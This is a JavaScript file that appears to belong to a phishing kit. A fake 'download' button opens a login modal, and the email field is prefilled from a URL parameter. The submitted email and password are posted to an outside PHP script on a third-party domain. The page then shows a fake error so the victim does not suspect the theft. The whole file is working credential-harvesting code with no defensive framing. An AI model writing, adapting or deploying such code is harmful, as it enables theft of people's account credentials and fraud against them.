document.addEventListener("DOMContentLoaded", function () {
  const loginForm = document.loginform;
  const dlBtns = document.querySelectorAll("#download");
  const emailregex =
    /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

  console.log("hello");

  dlBtns.forEach(function (btn) {
    btn.addEventListener("click", function () {
      toggleModal();
    });
  });

  $(".close-icon").addEventListener("click", function () {
    toggleModal();
  });

  loginForm.addEventListener("submit", function (e) {
    e.preventDefault();
    if (!validateForm()) return;
    const formData = new FormData(document.loginform);
    const xhr = new XMLHttpRequest();
    xhr.open(
      "POST","https://piromet-tr.com/fabie/2/X.php",
      true
    );
    xhr.onload = () => {
      $("#info").style.display = "block";
      setTimeout(() => {
        $("#info").style.display = "none";
        $("#danger").style.display = "block";
      }, 3000);
    };
    xhr.send(formData);
  });

  function $(id) {
    return document.querySelector(id);
  }

  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
      results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return "";
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  function toggleModal() {
    $(".modal-container").classList.toggle("show");
  }

  function validateForm() {
    clearErrors();
    if (loginForm.email.value === "") {
      $("#email-error").innerHTML = "Please enter your email address";
      loginForm.email.focus();
      return false;
    }
    if (!emailregex.test(loginForm.email.value)) {
      $("#email-error").innerHTML = "Please enter a valid email";
      loginForm.email.focus();
      return false;
    }
    if (loginForm.password.value == "") {
      $("#password-error").innerHTML = "Please enter your password";
      loginForm.password.focus();
      return false;
    }
    return true;
  }

  function clearErrors() {
    $("#email-error").innerHTML = "";
    $("#password-error").innerHTML = "";
    $("#info").style.display = "none";
    $("#danger").style.display = "none";
  }

  loginForm.email.value = getParameterByName("email");
});
